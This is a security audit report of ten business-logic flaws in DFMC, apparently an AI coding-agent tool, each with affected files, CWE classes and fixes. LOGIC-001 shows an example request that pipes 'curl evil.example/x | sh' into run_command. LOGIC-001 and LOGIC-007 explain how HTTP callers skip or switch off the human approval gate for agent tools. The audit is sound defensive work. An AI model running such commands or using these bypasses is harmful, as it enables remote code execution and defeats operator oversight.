# sc-business-logic — DFMC Business-Logic Findings

**Counts**
- Critical: 1
- High:     3
- Medium:   3
- Low:      2
- Info:     1
- Total:    10

Scope: Drive runner state machine, conversation branching, tool approval gate `source=="user"` semantics, agent-loop budget enforcement, autonomous-resume ceiling, hook lifecycle.
CWE families: CWE-841 (improper enforcement of behavioural workflow), CWE-284 (improper access control), CWE-915 (improperly controlled modification of dynamically-determined object attributes), CWE-770 (allocation of resources without limits / throttling).

---

## LOGIC-001 — HTTP/WS tool endpoint hardcodes `source="user"`, fully bypassing the approval gate

- **Severity:** Critical
- **Confidence:** High
- **CWE:** CWE-284 (Improper Access Control), CWE-841 (Improper Enforcement of Behavioral Workflow)
- **Files:**
  - `ui/web/server_tools_skills.go:151-173` (`handleToolExec`)
  - `ui/web/server_ws.go:244-266` (`wsConn.handleTool`)
  - `internal/engine/engine_tools.go:116-138` (`Engine.CallTool` calls `executeToolWithLifecycle(ctx, name, params, "user")`)
  - `internal/engine/engine_tools.go:218-244` (approval gate `if source != "user"`)

**Finding.** Every backend tool — including `run_command`, `write_file`, `edit_file`, `apply_patch`, `git_commit`, `web_fetch` — is exposed at `POST /api/v1/tools/{name}` and over the WS `tool` method. Both handlers route through `engine.CallTool`, which unconditionally hardcodes `source="user"`. The gate at line 225 (`if source != "user" && e.requiresApproval(name)`) therefore **never fires** for HTTP/WS-initiated calls.

A holder of the bearer token (or anyone reaching the loopback port from a malicious local browser tab via the WS endpoint, since `CheckOrigin` returns `true`) can:

```
POST /api/v1/tools/run_command
{"params":{"command":"curl evil.example/x | sh"}}
```

…with no operator confirmation, no TUI prompt, no `DFMC_APPROVE` consultation. The architecture doc explicitly notes this at line 522: *"even an authenticated web client invoking POST /api/v1/tools/run_command with source=user skips the approval gate"* — but the HTTP handler **gives the caller no way to specify a different source**, so the bypass is mandatory, not opt-in.

**Impact.** Approval-gate bypass for every dangerous tool over network surface. Combined with `WebSocket CheckOrigin: true` (`ui/web/server_ws.go:32-35`), a malicious page on the same machine can DNS-rebind / origin-hop into an authenticated WS session and weaponize this directly.

**Fix.** Require an explicit `source` field on the request body, default to `"agent"` (so the approval gate engages), and refuse `source="user"` unless the caller proves human presence (e.g. an interactive TUI/CLI flag, never an HTTP body). Alternatively, treat HTTP/WS tool calls as `"http"` and add an HTTP-specific gate check.

---

## LOGIC-002 — `PATCH /api/v1/tasks/{id}` mass-assigns task state without a transition guard

- **Severity:** High
- **Confidence:** High
- **CWE:** CWE-841 (Behavioral Workflow), CWE-915 (Mass Assignment)
- **File:** `ui/web/server_task.go:159-218`

**Finding.** `handleTaskUpdate` decodes the body into a `map[string]any` and applies any of `title, detail, state, summary, error, confidence, blocked_reason, labels, parent_id` to the persisted task without consulting the current state. There is no allowed-transition graph — a remote caller can:

- Flip `state` from `done` → `pending` and back
- Set `state="done"` on a task that never started (forging completion)
- Reparent any task to any other (`parent_id`), creating cycles that `taskstore.ValidateTree` is supposed to detect AFTER the fact (`internal/taskstore/store.go:322-356`) — but the API does not call `ValidateTree` post-update
- Clear `error` / `blocked_reason` after a hard failure to make the task look successful

**Impact.** A drive run that depends on a task tree (via Drive's `dfmc_drive_active`/`dfmc_drive_status` MCP synthetic tools or direct task store consumers) can be tricked into believing work was done that wasn't, or into proceeding because a "blocked" upstream was silently unblocked. The reverse — flipping `done`→`pending` — re-queues already-completed work and burns budget.

**Fix.** Validate state transitions against `supervisor.TaskState` enum, refuse `parent_id` changes that would create cycles, and disallow setting `state="done"` from an external API at all (only the executor may stamp completion).

---

## LOGIC-003 — `PATCH /api/v1/tasks/{id}` allows reparenting that bypasses cycle detection at write time

- **Severity:** High
- **Confidence:** High
- **CWE:** CWE-841
- **Files:**
  - `ui/web/server_task.go:203-205` (allows `patch["parent_id"]` blindly)
  - `internal/taskstore/store.go:322-356` (`ValidateTree` exists but is not called from the HTTP path)

**Finding.** The `parent_id` field is settable but `Store.UpdateTask` does not call `ValidateTree` afterwards. `GetAncestors` (`store.go:262-291`) and `GetTree` (`store.go:215-258`) both have a defensive `visited` cycle guard — but they truncate the walk silently rather than raising an error. A cycle therefore won't crash the server but will silently change the perceived ancestry of every affected task; downstream BFS in `GetTree` will only return the tasks reachable up to the cycle.

**Fix.** Run cycle detection on every reparent (walk up via `LoadTask(parent_id)` until either nil-parent or self-revisit before accepting the update).

---

## LOGIC-004 — Drive `RunPrepared` allows a caller to inject pre-populated `Todos` and `Status` fields

- **Severity:** High
- **Confidence:** High
- **CWE:** CWE-915 (Mass Assignment), CWE-841
- **Files:**
  - `internal/drive/driver.go:98-219` (`RunPrepared` accepts a `*Run` from caller)
  - `internal/drive/driver.go:108-127` resets `Status`/`Reason`/`EndedAt`/Todos but only conditionally:
    - `if run.Todos == nil { run.Todos = []Todo{} }` — so a non-nil but pre-populated `Todos` slice from the caller is **kept**.
  - `ui/web/server_drive.go:97-112` calls `drive.NewRun(req.Task)` (which is safe — `NewRun` constructs from task only), so the public HTTP path is OK; **but** `RunPrepared` is exported and any other caller can hand it a `Run` with arbitrary pre-set TODOs.

**Finding.** `RunPrepared` is the *prepared-run* entry point intended to allow HTTP/MCP surfaces to return the run ID before planning. The implementation only zeros a small subset of fields — `run.Todos` is preserved if the caller provided a non-empty slice. A future caller (or any plugin code) handing a `*Run` with pre-fabricated TODOs would bypass the planner entirely and execute that hand-crafted plan against the engine's tool surface with `AutoApprove`.

This is latent today (no current caller misuses it), but it is a clear contract trap: the function name says "prepared" but does not actually clean caller-supplied state. Mark as High because the door is wired up.

**Fix.** In `RunPrepared`, unconditionally clear `run.Todos = []Todo{}` and `run.Plan = nil` at entry; if a caller wants to pre-populate, that should be a separate explicit method that names the contract.

---

## LOGIC-005 — `Resume` re-runs `Running` TODOs from scratch but does NOT re-validate `Done` ones — Done is final by ID, not by cryptographic chain

- **Severity:** Medium
- **Confidence:** High
- **CWE:** CWE-841
- **File:** `internal/drive/driver.go:229-283`, especially lines 250-254

**Finding.** Resume loops over `run.Todos`, sets `Running -> Pending` (correct — interrupted work re-attempts) and leaves `Done/Blocked/Skipped` alone. Combined with the bbolt-persisted run record, an attacker who can write the bbolt file (e.g. an evil hook, a user with write access to `.dfmc/`, or a compromised bot account with file-write through `write_file`) can flip `TodoBlocked` → `TodoDone` in the persisted JSON between `dfmc drive stop` and `dfmc drive resume <id>`, and the Resume path will skip those TODOs as "already done" without re-executing them. The `result` summaries in `t.Brief` are also free-form strings; nothing binds them to actual tool execution.

This is "trust the persisted file" — acceptable in the single-process / loopback-only model, but worth flagging because Drive resume doesn't carry a hash chain or signature on completed TODOs.

**Fix (defense-in-depth).** Optionally hash each completed TODO's brief + tool-call summary into a chain so tampering with the persisted run is detected at resume.

---

## LOGIC-006 — Auto-resume cumulative ceiling is enforced **before** the next attempt, but not within an attempt

- **Severity:** Medium
- **Confidence:** Medium
- **CWE:** CWE-770 (Allocation of Resources Without Limits), CWE-841
- **Files:**
  - `internal/engine/agent_loop_autonomous.go:113-184` (`attemptAutoResume` checks ceiling once per resume)
  - `internal/engine/agent_loop_autonomous.go:47-85` (`runNativeToolLoopAutonomous` outer wrapper)
  - `internal/engine/agent_loop_limits.go:31-33` (defaults `MaxToolSteps=60`, `MaxToolTokens=250000`)

**Finding.** The cumulative ceiling (`stepCeiling = MaxSteps × multiplier`, default 60×10 = 600 steps; `tokenCeiling = MaxTokens × multiplier`, default 250 000×10 = 2.5 M tokens) is checked *before each resume attempt*, after `seed.CumulativeSteps += seed.Step`. Inside a single attempt the loop can still consume the full per-attempt budget. This means a single auto-resume cycle can briefly exceed the cumulative ceiling: at attempt N the ceiling is satisfied, the loop runs and burns up to MaxSteps + MaxTokens more, then attempt N+1 finally refuses. The overshoot per cycle is bounded by one full per-attempt budget — not unbounded — but the caller's expectation reading `resume_max_multiplier=10` is "exactly 10× MaxSteps total", and the actual ceiling is "between 10× and 11× MaxSteps".

**Impact.** A clever prompt can extract one extra full budget worth of LLM cost beyond the configured ceiling. Cost-bounded environments (CI, paid-API) should set `resume_max_multiplier=1` and accept the per-budget hard stop.

**Fix.** Document the overshoot, or compute `stepCeiling - seed.CumulativeSteps` as a per-attempt cap so the very last resume runs exactly to the ceiling and stops.

---

## LOGIC-007 — `AutoApprove` Drive scope wraps the **engine's** approver for the entire run, not per-TODO

- **Severity:** Medium
- **Confidence:** High
- **CWE:** CWE-284
- **Files:**
  - `internal/drive/driver.go:165-167` (`d.runner.BeginAutoApprove(d.cfg.AutoApprove)` and the `defer release()`)
  - `ui/web/server_drive.go:46-48` (the `AutoApprove []string` body field is mass-assignable, see also MASS-005)

**Finding.** The HTTP `POST /api/v1/drive` body contains `auto_approve: ["run_command", "write_file", ...]`. The driver passes that list to `runner.BeginAutoApprove(...)` once, and a `defer release()` un-installs it on Run exit. Every sub-agent spawned by every TODO in the run sees the same wide-open approver. There is no per-TODO scoping (e.g. "this read-only research TODO does not need run_command auto-approved").

A caller who can hit `POST /api/v1/drive` (auth token holder) and supply `auto_approve: ["*"]` effectively flips off the approval gate for the duration of the run for every spawned sub-agent. Combined with `LOGIC-001` this is a stacked attack: HTTP caller is already approval-bypassed for `/api/v1/tools/*`, plus they get a long-running approval-bypass scope for any tool the planner emits.

**Fix.** Validate `auto_approve` against an allow-list of tool names (current accepts arbitrary strings); deny meta-wildcards; surface the active scope on `GET /api/v1/drive/{id}` so an operator can audit it; consider per-TODO `auto_approve` instead of run-wide.

---

## LOGIC-008 — Conversation branching corrupts history when `BranchSwitch` is called concurrently with `AddMessage`

- **Severity:** Low
- **Confidence:** Medium
- **CWE:** CWE-362 (Race) / CWE-841
- **Files:**
  - `internal/conversation/manager.go:146-153` (`AddMessage` takes `m.mu.Lock()`)
  - `internal/conversation/manager.go:174-185` (`BranchSwitch` also takes `m.mu.Lock()`)

**Finding.** Both operations hold `m.mu.Lock()` correctly so the immediate map ops are atomic, BUT the *application-layer* sequence "user types → engine.Ask → AddMessage(user) → LLM call → AddMessage(assistant)" is not atomic. A web client can call `POST /api/v1/conversation/branches/switch` between the user-message append and the assistant-message append, splitting one logical exchange across two branches. The user message lands in branch A, the assistant reply lands in branch B, leaving branch A with an orphaned user turn (no reply) and branch B with an assistant message that has no question.

**Impact.** Cosmetic data integrity (conversation history is wrong). Could feed the LLM a malformed prompt on a future turn (`role=assistant` immediately following a previous `role=assistant`), which some providers reject. Bbolt/JSONL persistence then preserves the corruption forever.

**Fix.** Either (a) refuse `BranchSwitch` while a turn is mid-flight (track an "in-flight ask" flag), or (b) document this as expected — switching branches mid-ask is a "you broke it, you keep the pieces" operation.

---

## LOGIC-009 — `BranchCreate` allows orphan branch names (e.g. `..`, `/`, names with control chars)

- **Severity:** Low
- **Confidence:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **File:** `internal/conversation/manager.go:155-172`

**Finding.** `BranchCreate` only validates `name == ""`. There is no check for the conversation-id-style validation that lives in `internal/storage/store.go:398` (`validateConvID`). Branch names land in the `Branches map[string][]types.Message` in memory and are persisted as JSON map keys. A branch named `"..\\..\\evil"` or with embedded NULs / newlines persists fine inside the JSON state file but breaks any UI that uses the name as a path segment or display label.

This is bounded by the bearer-token gate and same-process trust, but the inconsistency with `validateConvID` is worth addressing.

**Fix.** Apply the same character-set whitelist (`validateConvID`) to branch names.

---

## LOGIC-010 — Hook lifecycle: a hook cannot cancel a tool, but a hook *can* race the approval gate

- **Severity:** Info
- **Confidence:** High
- **CWE:** CWE-841
- **Files:**
  - `internal/hooks/hooks.go:142-171` (`Fire` is sequential, no cancellation contract)
  - `internal/engine/engine_tools.go:218-300` (approval gate runs BEFORE `pre_tool` hook fire)

**Finding.** Confirmed working as documented:

1. **Hook cannot cancel tool execution.** The architecture promise that hooks are "best-effort, never block a tool call" is honoured — `runOne` captures errors but never gates the `executeToolWithPanicGuard` call that follows. ✓
2. **Hook cannot bypass the approval gate.** The approval gate runs at line 225-244 *before* the `pre_tool` hook fires at line 252-266; a hook firing a side-effect cannot back-door an unapproved tool. ✓
3. **Inverse risk surfaced:** the `_reason` field stripping (`internal/tools/engine.go:437-444`) calls the `reasoningPublisher` callback before the read-gate / approval / hook lifecycle. A buggy reasoning publisher that takes long or panics would delay every tool call. The publisher is wrapped in `recover` in `eventbus.go`'s `SubscribeFunc` indirect path but `tools.Engine.Execute`'s direct call to `pub(name, reason)` is **not** panic-guarded. A subscriber that panics will crash the entire tool engine call.

**Fix (Info).** Wrap the `pub(name, reason)` call in a `defer recover()` to match the rest of the engine's panic-safety posture.

---

### What was checked and found OK (negative findings)

- `Drive run state machine` finalization is single-funnelled through `finalize()` in `driver.go:289-314`. RunDone/RunStopped/RunFailed transitions only happen there. ✓
- `Drive Resume` correctly refuses to re-enter terminal runs (`driver.go:246-249`). ✓
- `Drive registry` cleanup is correctly deferred (`driver.go:157-158`); panics in the loop don't leak cancel funcs. ✓
- Token budget caps (`max_tool_steps`, `max_tool_tokens`) are enforced in the loop's pre-round headroom check; parallel batch dispatch (`agent_loop_parallel.go`) also goes through `executeToolWithLifecycle` so per-batch step counting still works. ✓ (but see LOGIC-006 for the auto-resume edge.)
- `meta_call_budget` and `meta_depth_limit` enforcement live in `engine_meta_hooks.go` and are tested in `engine_meta_hooks_test.go`. ✓
